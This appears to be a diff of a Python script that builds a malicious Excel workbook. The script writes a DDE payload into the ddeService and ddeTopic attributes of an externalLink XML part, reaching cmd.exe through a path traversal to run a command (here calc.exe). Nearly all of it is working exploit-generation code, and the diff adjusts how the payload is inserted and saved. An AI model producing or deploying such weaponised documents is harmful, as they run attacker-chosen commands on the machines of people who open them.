@@ -60,10 +60,6 @@ def gen_payload():
     \..\..\..\Windows\System32\cmd.exe
     /c calc.exe
     """
-
-    payload[0] = '"' + payload[0] + '"'
-    payload[1] = '"' + payload[1] + '"'
-    payload[2] = '"' + payload[2] + '"'
  
     print('[*] Selected DDE payload: {}'.format(payload[0] + "|" + payload[1] + " " + payload[2]))
 
@@ -93,13 +89,21 @@ if __name__ == "__main__":
     # Find 'externalLink' XML element and change DDE attributes (ddeService and ddeTopic) to DDE payload
     print('[*] Inserting DDE payload into {}/xl/externalLinks/externalLink1.xml...'.format(payload_out))
     for node in doctree.iter(tag=etree.Element):
-        if "externalLink" in node.tag:
+        if "ddeLink" in node.tag:
+            print node.tag
+            print etree.tostring(node)
             node.attrib['ddeService'] = ddeService
             node.attrib['ddeTopic'] = ddeTopic
+            print etree.tostring(doctree)
     
     # Create temp directory and extract payload.xlsx file to it
     tmp_dir_pay = tempfile.mkdtemp()
     zfpay.extractall(tmp_dir_pay)
+
+    # Write modified xl/externalLinks/externalLink1.xml to temp directory for payload.xlsxdocx
+    with open(os.path.join(tmp_dir_pay,'xl/externalLinks/externalLink1.xml'), 'w') as f:
+        xmlstr = etree.tostring(doctree)
+        f.write(xmlstr.decode())
 
     # Get a list of all the files in the original 
     filenames_pay = zfpay.namelist()
